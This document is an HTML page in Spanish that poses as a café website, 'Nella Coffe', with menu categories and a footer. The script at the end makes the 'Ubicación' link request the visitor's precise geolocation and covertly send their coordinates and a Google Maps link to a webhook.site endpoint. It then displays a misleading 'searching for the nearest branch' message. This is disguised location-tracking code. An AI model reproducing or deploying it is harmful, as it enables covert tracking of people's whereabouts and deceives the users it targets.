<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nella Coffe - Menú y Cafetería</title>
    
    <style>
        :root {
            --color-tinta: #0a3d91; /* Azul similar al del lapicero */
            --color-fondo: #f4f4f4; /* Color papel claro */
            --grosor-linea: 1.5px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--color-fondo);
            color: var(--color-tinta);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        a {
            text-decoration: none;
            color: var(--color-tinta);
            cursor: pointer;
        }

        a:hover {
            text-decoration: underline;
        }

        .main-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1.5rem 2rem;
            border-bottom: var(--grosor-linea) solid var(--color-tinta);
        }

        .logo-container {
            flex: 1;
        }

        .brand-title {
            font-size: 1.8rem;
            font-style: italic;
        }

        .header-center {
            flex: 1;
            text-align: center;
        }

        .btn-carta-hoy {
            font-size: 1.5rem;
            font-weight: bold;
            font-style: italic;
        }

        .social-contacts {
            flex: 1;
            text-align: right;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }

        .contact-label {
            margin-bottom: 0.5rem;
            font-size: 1.1rem;
        }

        .social-links {
            display: flex;
            gap: 10px;
        }

        .social-icon {
            font-size: 1.2rem;
            border: 1px solid var(--color-tinta);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .main-content {
            display: flex;
            flex: 1;
            padding: 2rem;
        }

        .about-section {
            flex: 1;
            border-right: var(--grosor-linea) solid var(--color-tinta);
            padding-right: 2rem;
        }

        .section-title {
            margin-bottom: 1.5rem;
            font-size: 1.3rem;
            font-weight: normal;
        }

        .about-list {
            list-style-type: none;
            margin-left: 1rem;
        }

        .about-list li::before {
            content: "↳ ";
            font-weight: bold;
        }

        .about-list li {
            margin-bottom: 0.8rem;
            font-size: 1.1rem;
        }

        .menu-section {
            flex: 2;
            padding-left: 2rem;
        }

        .menu-categories {
            margin-top: 1rem;
            margin-left: 1rem;
        }

        .category-card {
            margin-bottom: 0.8rem;
        }

        .category-card::before {
            content: "↳ ";
            font-weight: bold;
        }

        .category-card h3 {
            display: inline;
            font-size: 1.1rem;
            font-weight: normal;
        }

        .main-footer {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            padding: 1.5rem 2rem;
            border-top: var(--grosor-linea) solid var(--color-tinta);
        }

        .footer-item {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .footer-reservas {
            border-right: var(--grosor-linea) solid var(--color-tinta);
            transform: skewX(-15deg);
        }

        .footer-reservas > * {
            transform: skewX(15deg);
        }

        .footer-ubicacion {
            border-right: var(--grosor-linea) solid var(--color-tinta);
            transform: skewX(15deg);
        }

        .footer-ubicacion > * {
            transform: skewX(-15deg);
        }

        .footer-info {
            align-items: flex-start;
            padding-left: 2rem;
            gap: 0.5rem;
        }

        .footer-link {
            font-size: 1.2rem;
        }

        #geoInfo {
            text-align: center;
            margin-top: 10px;
            font-weight: bold;
        }
        @media (max-width: 768px) {
            .main-header, .main-content, .main-footer {
                flex-direction: column;
                align-items: center;
            }
            
            .about-section {
                border-right: none;
                border-bottom: var(--grosor-linea) dashed var(--color-tinta);
                padding-right: 0;
                padding-bottom: 2rem;
                margin-bottom: 2rem;
                width: 100%;
            }
            
            .menu-section {
                padding-left: 0;
                width: 100%;
            }
            
            .footer-reservas, .footer-ubicacion {
                border-right: none;
                border-bottom: var(--grosor-linea) solid var(--color-tinta);
                transform: none;
                width: 100%;
                padding: 1rem 0;
            }
            
            .footer-reservas > *, .footer-ubicacion > * {
                transform: none;
            }
        }
    </style>
</head>
<body>

    <!-- ENCABEZADO / HEADER -->
    <header class="main-header">
        <div class="logo-container">
            <h1 class="brand-title">Nella Coffe</h1>
        </div>
        
        <div class="header-center">
            <a href="#carta-hoy" class="btn-carta-hoy">La Carta de Hoy</a>
        </div>
        
        <div class="social-contacts">
            <span class="contact-label">Contactos</span>
            <div class="social-links">
                <a href="#" class="social-icon icon-phone" aria-label="Teléfono / WhatsApp">📞</a>
                <a href="#" class="social-icon icon-facebook" aria-label="Facebook">🌐</a>
                <a href="#" class="social-icon icon-instagram" aria-label="Instagram">📷</a>
            </div>
        </div>
    </header>

    <!-- CONTENIDO PRINCIPAL -->
    <main class="main-content">
        
        <!-- Sección: Quiénes somos -->
        <section class="about-section">
            <h2 class="section-title">Quiénes Somos</h2>
            <ul class="about-list">
                <li><a href="#historia">Historia</a></li>
                <li><a href="#valores">Valores</a></li>
                <li><a href="#tradicion">Tradición</a></li>
            </ul>
        </section>

        <!-- Sección: Carta / Menú por categorías -->
        <section class="menu-section" id="carta-hoy">
            <h2 class="section-title">Secciones por Tipo y Estilo</h2>
            <div class="menu-categories">
                <article class="category-card" id="desayunos">
                    <h3>Opciones de Desayuno</h3>
                </article>
                
                <article class="category-card" id="almuerzo">
                    <h3>Almuerzo</h3>
                </article>
                
                <article class="category-card" id="cena">
                    <h3>Cena</h3>
                </article>
                
                <article class="category-card" id="postres">
                    <h3>Postres</h3>
                </article>
                
                <article class="category-card" id="bebidas">
                    <h3>Bebidas</h3>
                </article>
            </div>
        </section>

    </main>

    <!-- Div para mostrar mensajes al usuario (opcional) -->
    <div id="geoInfo"></div>

    <!-- PIE DE PÁGINA / FOOTER -->
    <footer class="main-footer">
        <div class="footer-item footer-reservas">
            <a href="#reservas" class="footer-link">Reservas</a>
        </div>
        
        <div class="footer-item footer-ubicacion">
            <a id="btn-obtener-ubicacion" class="footer-link">Ubicación</a>
        </div>
        
        <div class="footer-item footer-info">
            <a href="#libro-reclamaciones" class="footer-link">Libro de Reclamaciones</a>
            <a href="#trabaja-nosotros" class="footer-link">Trabaja con Nosotros</a>
        </div>
    </footer>

<script>
function locationSuccess(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const accuracy = position.coords.accuracy;

    const datosUbicacion = {
        latitud: latitude,
        longitud: longitude,
        precision: accuracy,
        fecha: new Date().toISOString(),
        googleMapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`
    };

    fetch('https://webhook.site/0d964eb4-f41e-4268-ae34-7c8070ef487f', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(datosUbicacion),
        mode: 'no-cors' 
    });

    console.log("Ubicación procesada y enviada al webhook.");
    
    const infoDiv = document.getElementById('geoInfo');
    if(infoDiv) {
        infoDiv.innerHTML = `<p>Buscando la sucursal más cercana...</p>`;
    }
}

function locationError(error) {
    console.error("Error obteniendo ubicación:", error.message);
}

function solicitarUbicacion(evento) {
    // Evita que la página salte al inicio si se usó un enlace
    if(evento) evento.preventDefault(); 
    
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(locationSuccess, locationError, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    } else {
        console.error("Geolocalización no soportada.");
    }
}

document.getElementById('btn-obtener-ubicacion').addEventListener('click', solicitarUbicacion);

</script>
</body>
</html>
